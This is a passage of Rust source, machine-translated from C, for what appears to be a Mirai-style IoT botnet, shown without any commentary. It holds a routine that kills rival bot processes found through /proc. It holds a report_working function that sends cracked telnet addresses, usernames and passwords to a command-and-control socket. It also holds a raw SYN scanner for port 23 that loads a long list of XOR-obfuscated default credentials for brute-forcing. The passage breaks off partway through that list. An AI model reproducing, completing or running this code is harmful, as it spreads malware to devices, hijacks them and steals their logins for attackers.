                eika(
                    b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                        as *mut libc::c_char,
                ),
            );
            strcpy(ptr_path.offset(strlen(ptr_path) as isize), pid_0);
            strcpy(
                ptr_path.offset(strlen(ptr_path) as isize),
                eika(
                    b"'Q\xC1Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
                ),
            );
            if readlink(
                path.as_mut_ptr(),
                exe.as_mut_ptr(),
                4096 as libc::c_int as size_t,
            ) == -(1 as libc::c_int) as libc::c_long
            {
                continue;
            }
            strcpy(
                ptr_path,
                eika(
                    b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                        as *mut libc::c_char,
                ),
            );
            strcpy(ptr_path.offset(strlen(ptr_path) as isize), pid_0);
            strcpy(
                ptr_path.offset(strlen(ptr_path) as isize),
                b"/fd\0" as *const u8 as *const libc::c_char,
            );
            fd_dir = opendir(path.as_mut_ptr());
            if !fd_dir.is_null() {
                loop {
                    fd_entry = readdir(fd_dir);
                    if !(!fd_entry.is_null() && ret == 0 as libc::c_int) {
                        break;
                    }
                    let mut fd_str: *mut libc::c_char = ((*fd_entry).d_name)
                        .as_mut_ptr();
                    bzero(
                        exe.as_mut_ptr() as *mut libc::c_void,
                        4096 as libc::c_int as libc::c_ulong,
                    );
                    strcpy(ptr_path, b"/proc/\0" as *const u8 as *const libc::c_char);
                    strcpy(ptr_path.offset(strlen(ptr_path) as isize), pid_0);
                    strcpy(
                        ptr_path.offset(strlen(ptr_path) as isize),
                        b"/fd\0" as *const u8 as *const libc::c_char,
                    );
                    strcpy(
                        ptr_path.offset(strlen(ptr_path) as isize),
                        b"/\0" as *const u8 as *const libc::c_char,
                    );
                    strcpy(ptr_path.offset(strlen(ptr_path) as isize), fd_str);
                    if readlink(
                        path.as_mut_ptr(),
                        exe.as_mut_ptr(),
                        4096 as libc::c_int as size_t,
                    ) == -(1 as libc::c_int) as libc::c_long
                    {
                        continue;
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".armv7l\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".arm7\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"armv7l.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"arm7.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".armv6l\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".arm6\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"armv6l.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"arm6.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".armv5l\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".arm5\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"armv5l.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"arm5.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".armv4l\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".arm4\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"armv4l.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"arm4.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".mipsel\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".mpsl\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"mipsel.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"mpsl.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".mips\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"mips.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".sh4\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"sh4.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".ppc\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"ppc.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".i686\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"i686.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".x86\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"x86.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if !(strstr(
                        path.as_mut_ptr(),
                        b".i586\0" as *const u8 as *const libc::c_char,
                    ))
                        .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"i586.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b".x86\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        || !(strstr(
                            path.as_mut_ptr(),
                            b"x86.\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                    }
                    if util_stristr(
                        exe.as_mut_ptr(),
                        strlen(exe.as_mut_ptr()) as libc::c_int,
                        inode.as_mut_ptr(),
                    ) != -(1 as libc::c_int)
                    {
                        kill(util_atoi(pid_0, 10 as libc::c_int), 9 as libc::c_int);
                        ret = 1 as libc::c_int;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    return ret;
}
unsafe extern "C" fn report_working(
    mut daddr: uint32_t,
    mut dport: libc::c_int,
    mut auth: *mut scanner_auth,
    mut sock: libc::c_int,
) {
    let mut addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut pid: libc::c_int = fork();
    let mut fd: libc::c_int = 0;
    let mut entries: *mut resolv_entries = 0 as *mut resolv_entries;
    if pid > 0 as libc::c_int || pid == -(1 as libc::c_int) {
        return;
    }
    let mut ip: C2RustUnnamed_3 = C2RustUnnamed_3 { raw: 0 };
    ip.raw = daddr;
    let mut ip_addr: in_addr = in_addr { s_addr: 0 };
    ip_addr.s_addr = daddr;
    let mut scanSock: libc::c_int = 0;
    sockprintf(
        fd_cnc,
        b"TEL %s:%d %s:%s\n\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        inet_ntoa(ip_addr),
        dport,
        (*auth).username,
        (*auth).password,
    );
    _exit(0 as libc::c_int);
}
#[no_mangle]
pub unsafe extern "C" fn scanner_xywz(mut sock: libc::c_int) {
    let mut i_0: libc::c_int = 0;
    let mut source_port: uint16_t = 0;
    let mut iph: *mut iphdr = 0 as *mut iphdr;
    let mut tcph: *mut tcphdr = 0 as *mut tcphdr;
    scanner_pid = fork();
    if scanner_pid > 0 as libc::c_int || scanner_pid == -(1 as libc::c_int) {
        return;
    }
    rand_xywz();
    fake_time = time(0 as *mut time_t) as uint32_t;
    conn_table = calloc(
        512 as libc::c_int as libc::c_ulong,
        ::std::mem::size_of::<scanner_connection>() as libc::c_ulong,
    ) as *mut scanner_connection;
    i_0 = 0 as libc::c_int;
    while i_0 < 512 as libc::c_int {
        (*conn_table.offset(i_0 as isize)).state = SC_CLOSED;
        (*conn_table.offset(i_0 as isize)).fd = -(1 as libc::c_int);
        i_0 += 1;
    }
    rsck = socket(2 as libc::c_int, SOCK_RAW as libc::c_int, IPPROTO_TCP as libc::c_int);
    if rsck == -(1 as libc::c_int) {
        _exit(0 as libc::c_int);
    }
    fcntl(
        rsck,
        4 as libc::c_int,
        0o4000 as libc::c_int | fcntl(rsck, 3 as libc::c_int, 0 as libc::c_int),
    );
    i_0 = 1 as libc::c_int;
    if setsockopt(
        rsck,
        IPPROTO_IP as libc::c_int,
        3 as libc::c_int,
        &mut i_0 as *mut libc::c_int as *const libc::c_void,
        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
    ) != 0 as libc::c_int
    {
        close(rsck);
        _exit(0 as libc::c_int);
    }
    loop {
        source_port = (rand_next() & 0xffff as libc::c_int as libc::c_uint) as uint16_t;
        if !((ntohs(source_port) as libc::c_int) < 1024 as libc::c_int) {
            break;
        }
    }
    iph = scanner_rawpkt.as_mut_ptr() as *mut iphdr;
    tcph = iph.offset(1 as libc::c_int as isize) as *mut tcphdr;
    (*iph).set_ihl(5 as libc::c_int as libc::c_uint);
    (*iph).set_version(4 as libc::c_int as libc::c_uint);
    (*iph)
        .tot_len = (((::std::mem::size_of::<iphdr>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong) as libc::c_ushort
        as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
        | ((::std::mem::size_of::<iphdr>() as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong)
            as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as uint16_t;
    (*iph).id = rand_next() as uint16_t;
    (*iph).ttl = 64 as libc::c_int as uint8_t;
    (*iph).protocol = IPPROTO_TCP as libc::c_int as uint8_t;
    (*tcph)
        .dest = ((23 as libc::c_int as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | (23 as libc::c_int as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as uint16_t;
    (*tcph).source = source_port;
    (*tcph).set_doff(5 as libc::c_int as uint16_t);
    (*tcph).window = (rand_next() & 0xffff as libc::c_int as libc::c_uint) as uint16_t;
    (*tcph).set_syn(1 as libc::c_int as uint16_t);
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"ZA\x11\x17\x13\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"TKXZT\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        9 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x1A\x1A\x1A\x1A\x1A\x1A\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"ZOJFKRA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FGDCWNV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"HWCLVGAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x17\x16\x11\x10\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FGDCWNV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FGDCWNV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FGDCWNV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QWRRMPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQUMPF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QOACFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        2 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x14\x14\x14\x14\x14\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        2 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQUMPF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        2 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"INT\x13\x10\x11\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKLKQVPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKLKQVPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"OGKLQO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKLKQVPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"@WJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKLKQVPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RW@NKA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QGPTKAG\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QGPTKAG\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QGPTKAG\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRGPTKQMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QWRGPTKQMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"EWGQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"EWGQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"EWGQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"EWGQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"EWGQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQUMPF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKLKQVPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x14\x14\x14\x14\x14\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"\x14\x14\x14\x14\x14\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x1A\x1A\x1A\x1A\x1A\x1A\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"\x1A\x1A\x1A\x1A\x1A\x1A\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"W@LV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"W@LV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"W@LV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"INT\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        11 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"xVG\x17\x10\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"JK\x11\x17\x13\x1A\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"HT@XF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        9 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CLIM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"XNZZ\x0C\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        9 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"AJCLEGOG\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        12 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x15WHoIM\x12TKXZT\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x15WHoIM\x12CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"Q[QVGO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"KIU@\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FPGCO@MZ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"PGCNVGI\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x12\x12\x12\x12\x12\x12\x12\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x12\x12\x12\x12\x12\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x13\x13\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x17\x16\x11\x10\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x15WHoIM\x12CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\x13\x10\x11\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"OGKLQO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VGAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x1B\x1B\x1B\x1B\x1B\x1B\x1B\x1B\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"oGKLQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
